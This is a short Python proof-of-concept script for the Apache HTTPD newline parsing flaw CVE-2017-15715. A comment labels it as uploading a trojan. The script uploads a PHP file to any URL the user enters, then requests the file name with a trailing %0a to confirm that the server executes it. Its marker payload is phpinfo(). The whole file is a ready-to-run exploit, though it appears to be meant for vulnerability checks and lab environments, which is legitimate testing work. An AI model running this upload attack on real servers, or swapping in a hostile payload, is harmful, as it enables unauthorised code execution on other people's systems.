import requests
import time, re



#上传木马
def verify(url):
    relsult = {
        'name': 'Apache HTTPD 换行解析漏洞（CVE-2017-15715）',
        'vulnerable': False
    }
    filename = '/testing.php%0a'

    # 数据包头部
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
        'Content-Type': 'multipart/form-data; boundary=---------------------------153388130435749919031880185481'
    }
    # 上传数据
    data = '''-----------------------------153388130435749919031880185481
Content-Disposition: form-data; name="file"; filename="testing.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

-----------------------------153388130435749919031880185481
Content-Disposition: form-data; name="name"

testing.php

-----------------------------153388130435749919031880185481--'''

    try:
        respond = requests.post(url, headers=headers,data=data, timeout=3)
        v = requests.get(url + filename, timeout=3)
        if respond.status_code == 200 and re.search('PHP Version', v.text) and v.status_code == 200:
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['verify'] = url + filename
            relsult['about'] = 'https://www.cnblogs.com/confidant/p/15460396.html, https://vulhub.org/#/environments/httpd/CVE-2017-15715/'
            return relsult
        else:
          return relsult
    except:
        return relsult



if __name__ == '__main__':
    url = input('url:')
    print(verify(url))

